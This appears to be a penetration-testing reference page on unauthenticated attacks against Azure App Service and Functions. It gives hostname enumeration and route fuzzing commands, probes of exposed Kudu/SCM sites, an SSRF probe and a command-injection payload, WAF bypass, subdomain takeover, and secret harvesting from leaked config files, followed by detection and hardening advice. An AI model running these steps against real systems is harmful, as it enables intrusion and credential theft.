---
cstg_id: CSTG-AZURE-APP-SERVICE-FUNCTIONS-UNAUTH
title: "AZURE App Service Functions - Unauthenticated Access"
provider: azure
service: app-service-functions
phase: unauthenticated
required_access: unauthenticated
required_permissions: []
tools:
  - curl
  - dnsx
  - subfinder
  - ffuf
  - nuclei
  - amass
references:
  - "https://learn.microsoft.com/en-us/azure/app-service/overview"
  - "https://learn.microsoft.com/en-us/azure/azure-functions/functions-bindings-http-webhook-trigger"
  - "https://learn.microsoft.com/en-us/azure/app-service/configure-authentication-provider-aad"
  - "https://learn.microsoft.com/en-us/azure/azure-functions/security-concepts"
  - "https://learn.microsoft.com/en-us/azure/app-service/deploy-zip"
  - "https://learn.microsoft.com/en-us/azure/app-service/configure-common"
  - "https://hackingthe.cloud/azure/"
license: CC BY-SA 4.0
---

## Summary

Azure App Service and Azure Functions host web applications, REST APIs, and event-driven functions on Microsoft-managed infrastructure. Every App Service web app and Function App is exposed by default on a predictable, internet-facing hostname under the shared `*.azurewebsites.net` domain (for example `myapp.azurewebsites.net`), and Function HTTP triggers are reachable under `*.azurewebsites.net/api/<function>`. Behind the scenes each app is paired with a Kudu/SCM (Source Control Management) management site at `<app>.scm.azurewebsites.net` that provides file system access, a web-based command console, process explorer, deployment endpoints, and environment-variable disclosure.

This page covers what an unauthenticated, external party can discover and reach with no credentials: enumerating App Service / Function hostnames, fingerprinting the platform, probing for Function HTTP triggers with weak or absent authorization, abusing publicly readable deployment artifacts, and identifying exposed SCM/Kudu endpoints. The attacker objective at this phase is to map the externally reachable surface, harvest configuration or source disclosure, and identify any function or admin endpoint that can be invoked without authentication, providing an initial foothold or sensitive information leak.

## Prerequisites

- No Azure credentials or tenant relationship are required.
- Network egress to the public internet (HTTPS/443) to reach `*.azurewebsites.net` and any custom domains.
- Optionally a target organization name, brand keywords, or known custom domains to seed hostname discovery.

## Enumeration

### Discover candidate hostnames

App Service apps share the `azurewebsites.net` parent domain, making them highly enumerable. Custom domains often `CNAME` to the default hostname, leaking the platform.

```bash
# Resolve a known custom domain and look for an azurewebsites.net CNAME
dig +short www.target.com CNAME
host www.target.com

# Permutate brand keywords against the default suffix
for w in target target-api target-prod target-dev targetapp; do
  echo "$w.azurewebsites.net"
  dig +short "$w.azurewebsites.net"
done

# Passive subdomain discovery, then filter for the platform suffix
subfinder -d target.com -silent | tee subs.txt
amass enum -passive -d target.com | grep azurewebsites.net

# Bulk resolve a generated wordlist of candidate app names
ffuf -w names.txt -u "https://FUZZ.azurewebsites.net/" -mc 200,301,302,401,403,404 -of csv -o appsvc.csv
```

Related management/regional hostnames worth checking for any confirmed app `<app>`:

```
<app>.azurewebsites.net          # public site / app
<app>.scm.azurewebsites.net      # Kudu/SCM management site
<app>.scm.<region>.azurewebsites.net
<app>-staging.azurewebsites.net  # deployment slots are separate hostnames
```

### Fingerprint the platform and the SCM site

```bash
# Platform/server banners frequently reveal Kestrel + Azure App Service routing
curl -sI https://app.azurewebsites.net/ | grep -iE 'server|x-powered-by|x-aspnet|x-azure'

# Distinctive App Service error pages and IIS/ARR fingerprints
curl -s https://app.azurewebsites.net/this-does-not-exist | head -40

# The SCM site responds even when the main app does not
curl -sI https://app.scm.azurewebsites.net/
```

The Kudu/SCM site returns an Entra ID (`login.microsoftonline.com`) redirect or `401` when access is restricted, and an interactive dashboard when it is not. A `200` HTML dashboard from `scm.azurewebsites.net` without a login challenge is a critical exposure.

### Probe for Function HTTP triggers

Azure Functions HTTP triggers live under `/api/`. Each function declares an `authLevel` of `anonymous`, `function`, or `admin`. `anonymous` requires no key.

```bash
# Discover function routes
ffuf -w func-names.txt -u "https://app.azurewebsites.net/api/FUZZ" -mc 200,202,400,401,500

# An anonymous trigger returns 200/400/500 (reached the code);
# a key-protected trigger returns 401 "No Function Key was provided"
curl -s -o /dev/null -w "%{http_code}\n" https://app.azurewebsites.net/api/HttpTrigger1
curl -s "https://app.azurewebsites.net/api/HttpTrigger1?name=test"

# Built-in host status / admin surface (usually key-gated, test anyway)
curl -sI https://app.azurewebsites.net/admin/host/status
curl -sI https://app.azurewebsites.net/runtime/webhooks/durabletask
```

### Look for disclosed artifacts and template defaults

```bash
# Default ZipDeploy/Run-From-Package and common leak paths
for p in /.git/config /web.config /appsettings.json /package.json \
         /host.json /local.settings.json /.env /wwwroot/ /robots.txt; do
  echo "== $p =="; curl -s -o /dev/null -w "%{http_code}\n" "https://app.azurewebsites.net$p"
done

# Templated nuclei sweep for exposures and known App Service issues
nuclei -u https://app.azurewebsites.net -tags azure,exposure,config
```

## Misconfigurations & Findings

- **Anonymous Function HTTP triggers (`authLevel: anonymous`).** Any internet user can invoke business logic, abuse it as an SSRF/relay, exhaust quotas, or reach backend resources via the function's managed identity.
- **Exposed Kudu/SCM site without access restriction.** The SCM site at `<app>.scm.azurewebsites.net` exposes a command console (`/api/command`, `/DebugConsole`), the full file system (`/api/vfs/`), process listing, and environment variables (`/api/settings`, `/Env.cshtml`) which include connection strings and app settings. Reaching it unauthenticated, or with weakly protected publish credentials, is a direct path to RCE and secret theft.
- **Basic (publish-profile) authentication left enabled.** When SCM basic auth is enabled, credentials in a leaked `.PublishSettings` profile or guessable basic-auth allow deployment and console access without an Entra identity.
- **Source / config disclosure.** Readable `/.git/`, `appsettings.json`, `web.config`, `host.json`, or `local.settings.json` leak connection strings, storage keys, and downstream secrets.
- **Stack traces and debug pages.** ASP.NET detailed errors / `customErrors=Off` leak file paths, framework versions, and SQL.
- **Default `azurewebsites.net` hostname reachable** even when a WAF/CDN protects the custom domain, letting an attacker bypass the front door by hitting the origin hostname directly.
- **Subdomain takeover.** A dangling `CNAME` to a deleted `*.azurewebsites.net` app lets an attacker re-create the app name and serve content from the victim's domain.

## Exploitation

### Invoke an anonymous Function trigger

```bash
# Fuzz parameters and methods of a reachable anonymous trigger
curl -s "https://app.azurewebsites.net/api/Lookup?host=169.254.169.254"   # SSRF probe
curl -s -X POST https://app.azurewebsites.net/api/Process \
  -H 'Content-Type: application/json' -d '{"cmd":"id","url":"http://internal"}'
```

If the function forwards user input to outbound requests, attempt to reach the Instance Metadata Service or an internal endpoint; if it accepts a target URL or path, test for SSRF and path traversal.

### Bypass a fronting WAF/CDN via the origin hostname

If `www.target.com` is protected by a CDN/WAF but `target-prod.azurewebsites.net` resolves and serves the same app, requests sent directly to the `azurewebsites.net` origin bypass the protection layer. Confirm by comparing responses for a benign and a blocked payload across both hostnames.

### Subdomain takeover of a dangling hostname

```bash
# A CNAME pointing to an azurewebsites.net name that returns the
# "Web App - Unavailable" / 404 default page is a takeover candidate.
dig +short sub.target.com CNAME      # -> oldapp.azurewebsites.net
curl -sI https://oldapp.azurewebsites.net/   # 404 default = unclaimed
```

If the target name is unclaimed, an actor with any Azure subscription can create an App Service with that exact name, bind the dangling custom domain, and serve attacker content under the victim's brand (phishing, cookie theft, OAuth redirect abuse).

### Harvest secrets from disclosed artifacts

Pull any readable `appsettings.json`, `web.config`, `host.json`, `local.settings.json`, or `.git` history; extract storage account keys, SQL connection strings, service principal secrets, and API keys, then pivot to those services. Cross-reference [the enumeration page](../02-services/azure-app-service-functions-enum.md) once any credential is obtained.

## Detection & Logging

- **Azure Activity Logs** record control-plane operations (app create, config change, slot swap) but not individual HTTP requests to the app.
- **App Service / Function diagnostic logs** (`AppServiceHTTPLogs`, `AppServiceConsoleLogs`, `AppServiceAuditLogs`, `FunctionAppLogs`) sent to a Log Analytics workspace capture HTTP requests, console/Kudu activity, and authentication to the SCM site - the primary telemetry for unauthenticated probing. `AppServiceAuditLogs` specifically records SCM/Kudu logins.
- **Entra ID sign-in logs** show interactive and non-interactive authentication to the Easy Auth front door and to the SCM site when Entra auth is enforced; repeated `401` challenges indicate enumeration.
- High volumes of `404`/`401` against `/api/*` and `scm.azurewebsites.net`, requests to `/.git/`, `/appsettings.json`, and metadata-style SSRF parameters are detector signatures.
- **Microsoft Defender for App Service** raises managed alerts for suspicious access patterns, dangling-DNS/subdomain-takeover risk, and known web-shell or reconnaissance behavior.

## Remediation & Hardening

- Set Function HTTP trigger `authLevel` to `function` or `admin` for all non-public functions; treat `anonymous` as a deliberate, reviewed exception and apply rate limiting and input validation.
- Disable SCM/Kudu **basic authentication** (`az resource update --set properties.allow=false` on the `scm` and `ftp` basic-publishing-credentials policies) and require Entra ID for the SCM site.
- Apply **Access Restrictions** to both the main site and the `scm` site (IP allowlists, service tags, private endpoints) so management surfaces are not internet-reachable.
- Enable **App Service Authentication (Easy Auth)** to require Entra ID before any app code runs where appropriate.
- Disable detailed errors and remote debugging in production; do not deploy `.git`, `local.settings.json`, or backup files to `wwwroot`.
- Remove dangling DNS: delete `CNAME`/alias records when an app is decommissioned and prefer Azure-managed alias records that prevent takeover.
- Front the app with a WAF and lock the origin to accept traffic only from the WAF/Front Door (header secret + service tag) so the `azurewebsites.net` origin cannot be hit directly.
- Send all App Service/Function diagnostic categories to Log Analytics and enable Microsoft Defender for App Service.

## Tools

- `subfinder`, `amass`, `dnsx` - passive/active hostname discovery and CNAME resolution.
- `ffuf` - hostname and Function route brute forcing.
- `curl` - manual probing of triggers, SCM endpoints, and disclosed artifacts.
- `nuclei` - templated detection of exposures and known App Service issues.

## References

- [Azure App Service overview](https://learn.microsoft.com/en-us/azure/app-service/overview)
- [Azure Functions HTTP trigger and authorization levels](https://learn.microsoft.com/en-us/azure/azure-functions/functions-bindings-http-webhook-trigger)
- [Azure Functions security concepts](https://learn.microsoft.com/en-us/azure/azure-functions/security-concepts)
- [Configure Entra ID authentication for App Service](https://learn.microsoft.com/en-us/azure/app-service/configure-authentication-provider-aad)
- [Deploy via ZIP / Run From Package](https://learn.microsoft.com/en-us/azure/app-service/deploy-zip)
- [hackingthe.cloud - Azure](https://hackingthe.cloud/azure/)
